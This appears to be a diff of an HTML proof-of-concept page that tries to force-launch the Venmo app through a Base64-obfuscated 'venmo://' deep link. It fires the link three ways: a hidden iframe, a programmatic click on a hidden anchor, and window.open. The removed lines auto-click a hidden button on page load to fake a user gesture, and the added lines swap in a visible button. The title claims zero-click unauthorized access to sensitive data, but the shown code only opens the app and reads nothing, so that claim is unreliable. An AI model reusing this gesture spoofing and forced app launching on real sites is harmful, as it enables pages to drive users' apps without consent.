@@ -4,57 +4,68 @@
     <meta charset="UTF-8">
     <title>Venmo Zero‑Click PoC – FINAL UPDATE: EXACT METHOD DETERMINED (Zero‑click unauthorized access to sensitive data)</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Additional spoofing headers or meta tags can be added here -->
+    <style>
+      body { font-family: sans-serif; padding: 20px; }
+      #triggerButton { padding: 10px 20px; font-size: 16px; }
+    </style>
   </head>
   <body>
-    <!-- Hidden trigger element (will be auto‑clicked on DOMContentLoaded) -->
-    <button id="trigger" style="display:none;">Trigger Deep Link</button>
+    <h1>Venmo Zero‑Click Proof-of‑Concept</h1>
+    <p>
+      Click the button below to trigger the Venmo deep link using the same multi‑step mechanism
+      previously used to force‑launch the Amazon app without any user input.
+    </p>
+    <button id="triggerButton">Open Venmo App</button>
     
     <script>
-      // Base64 decoding function
+      // Decodes a Base64‑encoded string
       function decodeBase64(str) {
-        return decodeURIComponent(
-          atob(str)
+        try {
+          return decodeURIComponent(atob(str)
             .split('')
             .map(function(c) {
               return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
             })
-            .join('')
-        );
+            .join(''));
+        } catch (err) {
+          console.error('Error decoding base64:', err);
+          return '';
+        }
       }
-      
-      // Base64‑encoded deep link for Venmo ("venmo://")
+
+      // Base64‑encoded string for the Venmo deep link "venmo://"
       var encodedDeepLink = "dmVubW86Ly8=";
-      
-      // Function to initiate the deep link using multiple mechanisms
+
+      // Triggers the deep link using multiple mechanisms
       function triggerDeepLink() {
         var deepLink = decodeBase64(encodedDeepLink);
         console.log("Decoded deep link: " + deepLink);
-        
-        // 1. Create a hidden iframe and set its source to the deep link.
+
+        // Method 1: Create a hidden iframe and set its src to the deep link.
         var iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = deepLink;
         document.body.appendChild(iframe);
-        
-        // 2. Create a hidden anchor element, set its href, and simulate a click.
+        console.log("Hidden iframe created with src:", deepLink);
+
+        // Method 2: Create a hidden anchor element, set its href, and simulate a click.
         var a = document.createElement('a');
         a.href = deepLink;
         a.style.display = 'none';
         document.body.appendChild(a);
         a.click();
-        
-        // 3. Additionally, use a window.open call with a minimal delay.
+        console.log("Hidden anchor clicked with href:", deepLink);
+
+        // Method 3: Use window.open with a minimal delay.
         setTimeout(function() {
           window.open(deepLink, '_self');
+          console.log("window.open executed with:", deepLink);
         }, 5);
       }
-      
-      // On DOMContentLoaded, simulate a trusted user gesture.
-      document.addEventListener('DOMContentLoaded', function() {
-        var btn = document.getElementById('trigger');
-        btn.addEventListener('click', triggerDeepLink);
-        btn.click();
+
+      // Add an event listener for a user gesture (button click) to trigger the exploit chain.
+      document.getElementById('triggerButton').addEventListener('click', function() {
+        triggerDeepLink();
       });
     </script>
   </body>
